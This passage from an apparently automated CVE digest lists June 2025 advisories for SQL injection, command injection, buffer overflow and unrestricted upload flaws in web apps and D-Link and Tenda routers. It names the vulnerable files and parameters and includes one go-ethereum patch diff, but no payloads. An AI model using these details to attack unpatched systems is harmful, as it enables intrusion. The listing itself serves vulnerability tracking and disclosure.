  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability classified as critical has been found in D-Link DI-7300G+ 19.12.25A1. Affected is an unknown function of the file wget_test.asp. The manipulation of the argument url leads to os command injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/2664521593/mycve/blob/main/D-Link_DI/CJ_IN_DLink_1_en.pdf [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314388 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314388 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604441 [Third Party Advisory, VDB Entry]
  5. https://www.dlink.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314388 ---
url

================================================================================


CVE ID: CVE-2025-6891
Published: 2025-06-30T07:15:23.280
Modified: 2025-07-08T14:16:33.023
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in code-projects Inventory Management System 1.0. Affected is an unknown function of the file /php_action/createUser.php. The manipulation of the argument Username leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/tangjihong1974/cve/issues/2 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314370 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314370 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603882 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314370 ---
userName

================================================================================


CVE ID: CVE-2025-6890
Published: 2025-06-30T06:15:29.353
Modified: 2025-07-08T14:16:41.300
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Movie Ticketing System 1.0. It has been rated as critical. This issue affects some unknown processing of the file /ticketConfirmation.php. The manipulation of the argument Date leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/31 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314369 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314369 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603844 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314369 ---
date

================================================================================


CVE ID: CVE-2025-6889
Published: 2025-06-30T06:15:28.847
Modified: 2025-07-08T14:16:47.070
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Movie Ticketing System 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /logIn.php. The manipulation of the argument postName leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/30 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314368 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314368 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603831 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314368 ---
postName

================================================================================


CVE ID: CVE-2025-6888
Published: 2025-06-30T05:15:41.340
Modified: 2025-07-08T14:16:55.400
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in PHPGurukul Teachers Record Management System 2.1. It has been classified as critical. This affects an unknown part of the file /admin/changeimage.php. The manipulation of the argument tid leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/louis-zly/myCVE/issues/3 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314367 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314367 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603793 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314367 ---
tid

================================================================================


CVE ID: CVE-2025-6887
Published: 2025-06-30T05:15:41.103
Modified: 2025-07-01T16:42:48.927
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability was found in Tenda AC5 15.03.06.47 and classified as critical. Affected by this issue is some unknown functionality of the file /goform/SetSysTimeCfg. The manipulation of the argument time/timeZone leads to stack-based buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (7):
  1. https://lavender-bicycle-a5a.notion.site/Tenda-AC5-fromSetSysTime_time-21d53a41781f8002bdb3fe8344d6fd8c?source=copy_link [Exploit, Third Party Advisory]
  2. https://lavender-bicycle-a5a.notion.site/Tenda-AC5-fromSetSysTime_timeZone-21d53a41781f8021ae2fd2ac639f1b3f?source=copy_link [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314366 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314366 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603788 [Third Party Advisory, VDB Entry]
  6. https://vuldb.com/?submit.603789 [Third Party Advisory, VDB Entry]
  7. https://www.tenda.com.cn/ [Product]

Attempting to extract code examples from references...

--- Code from https://lavender-bicycle-a5a.notion.site/Tenda-AC5-fromSetSysTime_time-21d53a41781f8002bdb3fe8344d6fd8c?source=copy_link ---
time

/goform/SetSysTimeCfg

fromSetSysTime

================================================================================


CVE ID: CVE-2025-6886
Published: 2025-06-30T05:15:40.763
Modified: 2025-07-01T16:47:02.973
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability has been found in Tenda AC5 15.03.06.47 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /goform/openSchedWifi. The manipulation of the argument schedStartTime/schedEndTime leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (7):
  1. https://lavender-bicycle-a5a.notion.site/Tenda-AC5-setSchedWifi_schedEndTime-21d53a41781f80fb8a90f08898e8d404?source=copy_link [Exploit, Third Party Advisory]
  2. https://lavender-bicycle-a5a.notion.site/Tenda-AC5-setSchedWifi_schedStartTime-21d53a41781f803f97eeddd9828c5c84?source=copy_link [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314365 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314365 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603774 [Third Party Advisory, VDB Entry]
  6. https://vuldb.com/?submit.603775 [Third Party Advisory, VDB Entry]
  7. https://www.tenda.com.cn/ [Product]

Attempting to extract code examples from references...

--- Code from https://lavender-bicycle-a5a.notion.site/Tenda-AC5-setSchedWifi_schedEndTime-21d53a41781f80fb8a90f08898e8d404?source=copy_link ---
schedEndTime

/goform/openSchedWifi

setSchedWifi

================================================================================


CVE ID: CVE-2025-6885
Published: 2025-06-30T04:15:33.767
Modified: 2025-07-08T14:17:03.797
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, was found in PHPGurukul Teachers Record Management System 2.1. Affected is an unknown function of the file /admin/edit-teacher-detail.php. The manipulation of the argument tid leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/louis-zly/myCVE/issues/2 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314364 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314364 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603766 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314364 ---
tid

================================================================================


CVE ID: CVE-2025-6884
Published: 2025-06-30T03:15:26.687
Modified: 2025-07-08T14:18:11.347
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in code-projects Staff Audit System 1.0. This issue affects some unknown processing of the file /search_index.php. The manipulation of the argument Search leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/qingchuana/q1ngchuan/issues/8 [Exploit, Issue Tracking]
  3. https://vuldb.com/?ctiid.314363 [Permissions Required, Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?id.314363 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603720 [Third Party Advisory, VDB Entry]
  6. https://github.com/qingchuana/q1ngchuan/issues/8 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314363 ---
search

================================================================================


CVE ID: CVE-2025-6883
Published: 2025-06-30T03:15:26.507
Modified: 2025-07-08T14:18:19.600
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in code-projects Staff Audit System 1.0. This vulnerability affects unknown code of the file /update_index.php. The manipulation of the argument updateid leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/qingchuana/q1ngchuan/issues/7 [Exploit, Issue Tracking]
  3. https://vuldb.com/?ctiid.314362 [Permissions Required, Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?id.314362 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603719 [Third Party Advisory, VDB Entry]
  6. https://github.com/qingchuana/q1ngchuan/issues/7 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314362 ---
updateid

================================================================================


CVE ID: CVE-2025-6882
Published: 2025-06-30T03:15:26.287
Modified: 2025-07-14T17:18:53.997
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability classified as critical has been found in D-Link DIR-513 1.0. This affects an unknown part of the file /goform/formSetWanPPTP. The manipulation of the argument curTime leads to buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. This vulnerability only affects products that are no longer supported by the maintainer.

References (5):
  1. https://vuldb.com/?ctiid.314361 [Permissions Required, VDB Entry]
  2. https://vuldb.com/?id.314361 [Third Party Advisory, VDB Entry]
  3. https://vuldb.com/?submit.603693 [Third Party Advisory, VDB Entry]
  4. https://www.dlink.com/ [Product]
  5. https://vuldb.com/?submit.603693 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314361 ---
curTime

================================================================================


CVE ID: CVE-2025-6881
Published: 2025-06-30T02:15:21.420
Modified: 2025-07-08T14:18:32.693
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability was found in D-Link DI-8100 16.07.21. It has been rated as critical. Affected by this issue is some unknown functionality of the file /pppoe_base.asp of the component jhttpd. The manipulation of the argument mschap_en leads to buffer overflow. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (4):
  1. https://vuldb.com/?ctiid.314360 [Permissions Required]
  2. https://vuldb.com/?id.314360 [Third Party Advisory, VDB Entry]
  3. https://vuldb.com/?submit.603692 [Exploit, Third Party Advisory, VDB Entry]
  4. https://www.dlink.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314360 ---
mschap_en

================================================================================


CVE ID: CVE-2025-6880
Published: 2025-06-30T01:15:25.463
Modified: 2025-07-01T19:11:30.937
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in SourceCodester Best Salon Management System 1.0. Affected is an unknown function of the file /panel/edit-tax.php. The manipulation of the argument editid leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-21.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314352 [Permissions Required]
  3. https://vuldb.com/?id.314352 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603657 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314352 ---
editid

================================================================================


CVE ID: CVE-2025-6877
Published: 2025-06-30T00:15:22.443
Modified: 2025-07-01T19:09:32.470
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in SourceCodester Best Salon Management System 1.0. It has been classified as critical. This affects an unknown part of the file /panel/edit-category.php. The manipulation of the argument editid leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-18.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314349 [Permissions Required]
  3. https://vuldb.com/?id.314349 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603654 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314349 ---
editid

================================================================================


CVE ID: CVE-2025-6876
Published: 2025-06-29T23:15:21.277
Modified: 2025-07-01T19:08:59.047
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in SourceCodester Best Salon Management System 1.0 and classified as critical. Affected by this issue is some unknown functionality of the file /panel/add-category.php. The manipulation of the argument Name leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-17.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314348 [Permissions Required]
  3. https://vuldb.com/?id.314348 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603653 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314348 ---
name

================================================================================


CVE ID: CVE-2025-6875
Published: 2025-06-29T23:15:21.067
Modified: 2025-07-01T18:53:33.650
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in SourceCodester Best Salon Management System 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /panel/edit-subscription.php. The manipulation of the argument editid leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-16.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314347 [Permissions Required]
  3. https://vuldb.com/?id.314347 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603652 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314347 ---
editid

================================================================================


CVE ID: CVE-2025-6874
Published: 2025-06-29T22:15:22.637
Modified: 2025-07-01T18:49:08.733
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, was found in SourceCodester Best Salon Management System 1.0. Affected is an unknown function of the file /panel/add_subscribe.php. The manipulation of the argument user_id/plan_id leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-15.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314346 [Permissions Required]
  3. https://vuldb.com/?id.314346 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603651 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314346 ---
user_id/plan_id

================================================================================


CVE ID: CVE-2025-6873
Published: 2025-06-29T22:15:21.593
Modified: 2025-07-01T18:48:37.450
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability, which was classified as critical, has been found in SourceCodester Simple Company Website 1.0. This issue affects some unknown processing of the file /classes/Users.php?f=save. The manipulation of the argument img leads to unrestricted upload. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/29 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314345 [Permissions Required]
  3. https://vuldb.com/?id.314345 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603645 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314345 ---
img

================================================================================


CVE ID: CVE-2025-6872
Published: 2025-06-29T21:15:22.790
Modified: 2025-07-01T18:47:20.500
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability classified as critical was found in SourceCodester Simple Company Website 1.0. This vulnerability affects unknown code of the file /classes/SystemSettings.php?f=update_settings. The manipulation of the argument img leads to unrestricted upload. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/28 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314344 [Permissions Required]
  3. https://vuldb.com/?id.314344 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603643 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314344 ---
img

================================================================================


CVE ID: CVE-2025-6871
Published: 2025-06-29T21:15:22.587
Modified: 2025-07-01T18:46:42.920
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in SourceCodester Simple Company Website 1.0. This affects an unknown part of the file /classes/Login.php. The manipulation of the argument Username leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/27 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314343 [Permissions Required]
  3. https://vuldb.com/?id.314343 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603641 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314343 ---
username

================================================================================


CVE ID: CVE-2015-20112
Published: 2025-06-29T21:15:22.210
Modified: 2025-06-30T18:38:23.493
CVSS Score: 3.4 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N

CWE Categories:
  - CWE-325: CWE-325

Description:
RLPx 5 has two CTR streams based on the same key, IV, and nonce. This can facilitate decryption on a private network.

References (5):
  1. https://github.com/LaurentMT/go-ethereum/commit/e8cba7283b57280b1bcf5761478f852398365901
  2. https://github.com/ethereum/devp2p/blob/master/rlpx.md#known-issues-in-the-current-version
  3. https://github.com/ethereum/devp2p/issues/32
  4. https://github.com/ethereum/go-ethereum/issues/1315
  5. https://github.com/hyperledger/besu/issues/7926

Attempting to extract code examples from references...

--- Code from https://github.com/LaurentMT/go-ethereum/commit/e8cba7283b57280b1bcf5761478f852398365901 ---
From e8cba7283b57280b1bcf5761478f852398365901 Mon Sep 17 00:00:00 2001
From: LaurentMT <laurent.salat@bbox.fr>
Date: Sun, 27 Nov 2016 18:39:02 +0100
Subject: [PATCH] Fix for #1315 (for private networks only)

---
 p2p/rlpx.go | 41 +++++++++++++++++++++++++++++++----------
 1 file changed, 31 insertions(+), 10 deletions(-)

diff --git a/p2p/rlpx.go b/p2p/rlpx.go
index 2a9bdc121f2..61507e14e1a 100644
--- a/p2p/rlpx.go
+++ b/p2p/rlpx.go
@@ -164,17 +164,20 @@ func (t *rlpx) doEncHandshake(prv *ecdsa.PrivateKey, dial *discover.Node) (disco
 	var (
 		sec secrets
 		err error
+		initiator bool	// A flag tracking if node is initiator of the handshake
 	)
 	if dial == nil {
 		sec, err = receiverEncHandshake(t.fd, prv, nil)
+		initiator = false
 	} else {
 		sec, err = initiatorEncHandshake(t.fd, prv, dial.ID, nil)
+		initiator = true
 	}
 	if err != nil {
 		return discover.NodeID{}, err
 	}
 	t.wmu.Lock()
-	t.rw = newRLPXFrameRW(t.fd, sec)
+	t.rw = newRLPXFrameRW(t.fd, sec, initiator)
 	t.wmu.Unlock()
 	return sec.RemoteID, nil
 }
@@ -194,7 +197,7 @@ type encHandshake struct {
 // which are negotiated during the encryption handshake.
 type secrets struct {
 	RemoteID              discover.NodeID
-	AES, MAC              []byte
+	AES, AES2, MAC        []byte
 	EgressMAC, IngressMAC hash.Hash
 	Token                 []byte
 }
@@ -233,10 +236,12 @@ func (h *encHandshake) secrets(auth, authResp []byte) (secrets, error) {
 	// derive base secrets from ephemeral key agreement
 	sharedSecret := crypto.Keccak256(ecdheSecret, crypto.Keccak256(h.respNonce, h.initNonce))
 	aesSecret := crypto.Keccak256(ecdheSecret, sharedSecret)
+	aesSecret2 := crypto.Keccak256(ecdheSecret, aesSecret)	// derive a second secret for aes
 	s := secrets{
 		RemoteID: h.remoteID,
 		AES:      aesSecret,
-		MAC:      crypto.Keccak256(ecdheSecret, aesSecret),
+		AES2:     aesSecret2,
+		MAC:      crypto.Keccak256(ecdheSecret, aesSecret2), // derive mac secret from second aes secret
 	}
 
 	// setup sha3 instances for the MACs
@@ -558,22 +563,38 @@ type rlpxFrameRW struct {
 	ingressMAC hash.Hash
 }
 
-func newRLPXFrameRW(conn io.ReadWriter, s secrets) *rlpxFrameRW {
+func newRLPXFrameRW(conn io.ReadWriter, s secrets, initiator bool) *rlpxFrameRW {
 	macc, err := aes.NewCipher(s.MAC)
 	if err != nil {
 		panic("invalid MAC secret: " + err.Error())
 	}
-	encc, err := aes.NewCipher(s.AES)
+	// initializes aes keys according to role played by node during the handshake
+	var enccKey, deccKey []byte
+	if initiator {
+		enccKey = s.AES
+		deccKey = s.AES2
+	} else {
+		enccKey = s.AES2
+		deccKey = s.AES
+	}
+	// create 2 cyphers
+	encc, err := aes.NewCipher(enccKey)
+	if err != nil {
+		panic("invalid AES secret: " + err.Error())
+	}
+	decc, err := aes.NewCipher(deccKey)
 	if err != nil {
 		panic("invalid AES secret: " + err.Error())
 	}
-	// we use an all-zeroes IV for AES because the key used
-	// for encryption is ephemeral.
-	iv := make([]byte, encc.BlockSize())
+	// we use an all-zeroes IVs for AES because the keys used
+	// for encryption are ephemeral.
+	enccIv := make([]byte, encc.BlockSize())
+	deccIv := make([]byte, decc.BlockSize())
+
 	return &rlpxFrameRW{
 		conn:       conn,
-		enc:        cipher.NewCTR(encc, iv),
-		dec:        cipher.NewCTR(encc, iv),
+		enc:        cipher.NewCTR(encc, enccIv),
+		dec:        cipher.NewCTR(decc, deccIv),
 		macCipher:  macc,
 		egressMAC:  s.EgressMAC,
 		ingressMAC: s.IngressMAC,


================================================================================


CVE ID: CVE-2025-6870
Published: 2025-06-29T20:15:25.330
Modified: 2025-07-01T18:22:04.620
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability was found in SourceCodester Simple Company Website 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file /classes/Content.php?f=service. The manipulation of the argument img leads to unrestricted upload. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/26 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314342 [Permissions Required]
  3. https://vuldb.com/?id.314342 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603640 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314342 ---
img

================================================================================


CVE ID: CVE-2025-6869
Published: 2025-06-29T20:15:25.160
Modified: 2025-07-08T18:14:47.197
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in SourceCodester Simple Company Website 1.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file /admin/testimonials/manage.php. The manipulation of the argument ID leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/25 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314341 [Permissions Required]
  3. https://vuldb.com/?id.314341 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.603639 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314341 ---
id

================================================================================


CVE ID: CVE-2025-6868
Published: 2025-06-29T19:15:22.720
Modified: 2025-07-08T14:37:18.003
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in SourceCodester Simple Company Website 1.0. It has been classified as critical. Affected is an unknown function of the file /admin/clients/manage.php. The manipulation of the argument ID leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
